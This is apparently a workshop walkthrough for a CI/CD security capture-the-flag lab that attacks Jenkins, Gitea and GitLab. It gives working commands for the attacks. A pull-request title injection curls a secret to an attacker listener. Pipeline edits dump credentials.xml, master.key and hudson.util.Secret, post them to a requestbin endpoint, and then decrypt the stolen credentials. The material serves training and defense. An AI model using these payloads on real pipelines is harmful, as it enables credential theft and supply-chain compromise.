This Walk Thru contains commands and snippets that will be used in the workshop, and should help save time from manually typing complex commands or copying and pasting from slides which may mangle text.

### URL List

CTFd
- http://`[randomhash]`.mylabserver.com:8000
  - alice/alice

Gitea
- http://`[randomhash]`.mylabserver.com:3000
  - thealice/thealice

GitLab
- http://`[randomhash]`.mylabserver.com:4000
  - alice/alice1234

Jenkins
- http://`[randomhash]`.mylabserver.com:8080
  - alice/alice



### Slide 23
```
withCredentials([string(credentialsId 'flag1', variable: 'flag1')])
    sh '''
        echo $flag1 |base64
    '''
}
```

### Slide 24

Decode the flag 

> Replace {base64} with the base64 in the console output
```
echo "{base64}" | base64 -d
```

### Slide 27

```
docker pull ghcr.io/gitleaks/gitleaks:latest
```

```
git clone http://localhost:3000/Wonderland/duchess.git
```

```
docker run -v ./duchess/:/path ghcr.io/gitleaks/gitleaks:latest detect --source="/path" -v
```

```
cd duchess
```

```
ls -al
```

```
git log -L 8,8:.pypirc 43f216c
```

### Slide 31

Return to home from less exercise
```
cd ~
```

Get IP address of host network interface
```
ip addr show dev ens5
```

```
sudo netcat -nvlp 80
```

Go to Gitea instance

http://<server>:3000/

thealice/thealice

http://<server>:3000/Cov/reportcov

Paste this into pull request title, replace `<YOUR SERVER IP>` with the one you got from the `ip addr` command above.
```
echo ${KEY} > key && curl -v -F file=@key <YOUR SERVER IP>
```

### Slide 35

```
git clone http://localhost:3000/Wonderland/mock-turtle.git
```

Use the same creds for gitea: thealice/thealice

```
cd mock-turtle
```

```
git checkout -b branch1
```

```
nano version
```

Update the version number 

Save the file `Ctrl-O`

Exit nano `Ctrl-X`

### Slide 36

```
nano Jenkinsfile
```

Paste this into the file at the line just below `steps {`:
```
withCredentials([usernamePassword(credentialsId: 'flag10', usernameVariable: 'USERNAME', passwordVariable: 'TOKEN')]) {
    sh 'echo $TOKEN | base64'
}
```

Save the file `Ctrl-O`

Exit nano `Ctrl-X`

Next commit the file change

```
git add version Jenkinsfile
```

```
git commit -m "New version"
```

Push the changes up to the repository
```
git push --set-upstream origin branch1
```

In Gitea navigate to the mock-turtle repo, and switch to the new branch `branch1`

Create a pull request and submit it.

The pull request should get autoapproved.

Go to Jenkins and you should see an automated build kicked off for the new "version".

Look at the console output of the new build.

### Slide 41

Replace `any` with the below
```
built-in
```
>e.g. `agent {node 'built-in'}`

Add the following to the `sh """` block
```
echo $JENKINS_HOME
cat $JENKINS_HOME/credentials.xml | base64
cat $JENKINS_HOME/secrets/master.key | base64
cat $JENKINS_HOME/secrets/hudson.util.Secret | base64
ls $JENKINS_HOME
cat $JENKINS_HOME/flag5.txt
```
>Your code should look like the below:
>```
>sh """
>    virtualenv venv
>    pip install -r requirements.txt || true
>    echo $JENKINS_HOME
>    cat $JENKINS_HOME/credentials.xml | base64
>    cat $JENKINS_HOME/secrets/master.key | base64
>    cat $JENKINS_HOME/secrets/hudson.util.Secret | base64
>    ls $JENKINS_HOME
>    cat $JENKINS_HOME/flag5.txt
>"""
>```

>**Note**: Jenkins is a fork of Hudson https://en.wikipedia.org/wiki/Hudson_(software) which was originally made by Sun Microsystems as an Open Source Project, then forked when Oracle bought it and wanted to trademark/monitize Hudson. So you'll sometimes see references to it such as in one of the files above.

### Slide 42


Go to requestbin.com and create a public bin

```
stage('Install Requirements') {
  steps {
    sh """
      curl -X POST \
      -F "file1=\$(cat $JENKINS_HOME/credentials.xml | base64 -w 0 | rev)" \
      -F "file2=\$(cat $JENKINS_HOME/secrets/master.key | base64 -w 0 | rev)" \
      -F "file3=\$(cat $JENKINS_HOME/secrets/hudson.util.Secret |base64 -w 0 | rev)" \
      -F "file4=\$(cat $JENKINS_HOME/flag5.txt | base64 | rev)" \
      ENDPOINT_URL
    """
  }


}
```

### Extract the creds

For each of the files you need to decode them and write them to the a file.

```
echo "{base64}" | rev | base64 -d > credentials.xml
```

```
echo "{base64}" |rev |base64 -d > master.key
```

```
echo "{base64}" |rev base64 -d > hudson.util.Secret
```

We can use a docker image with a Jenkins credential storage decrypter from here.

```
docker run \
  --rm \
  --network none \
  --workdir / \
  --mount "type=bind,src=$PWD/master.key,dst=/master.key" \
  --mount "type=bind,src=$PWD/hudson.util.Secret,dst=/hudson.util.Secret" \
  --mount "type=bind,src=$PWD/credentials.xml,dst=/credentials.xml" \
  docker.io/hoto/jenkins-credentials-decryptor:latest \
  /jenkins-credentials-decryptor \
    -m master.key \
    -s hudson.util.Secret \
    -c credentials.xml \
    -o json
```

### Resources

[NSA/CISA Defending Continuous Integration/Continuous Delivery (CI/CD) Environments](https://media.defense.gov/2023/Jun/28/2003249466/-1/-1/0/CSI_DEFENDING_CI_ENVIRONMENTS.PDF)

[NIST Strategies for the Integration of Software Supply Chain Security in DevSecOps CI/CD pipelines](https://csrc.nist.gov/pubs/sp/800/204/d/ipd)

[OWASP Top 10 CICD Risks](https://owasp.org/www-project-top-10-ci-cd-security-risks/)

[CI/CD GOAT](https://github.com/cider-security-research/cicd-goat/#readme)

